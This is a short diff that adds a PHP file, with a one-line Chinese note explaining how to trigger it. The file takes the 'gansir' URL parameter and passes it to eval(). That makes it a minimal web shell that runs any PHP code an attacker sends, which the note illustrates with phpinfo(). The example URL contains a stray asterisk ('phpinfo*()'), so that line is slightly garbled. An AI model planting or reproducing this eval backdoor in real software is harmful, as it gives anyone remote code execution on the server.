@@ -1,0 +1,8 @@
+<?php
+if(isset($_GET['gansir'])){
+$gansir=$_GET['gansir'];
+eval("\$gansir = $gansir;");
+}
+?>
+
+当在网页输入xxx/234.php?gansir=phpinfo*(); phpinfo()代码将被直接执行并返回值
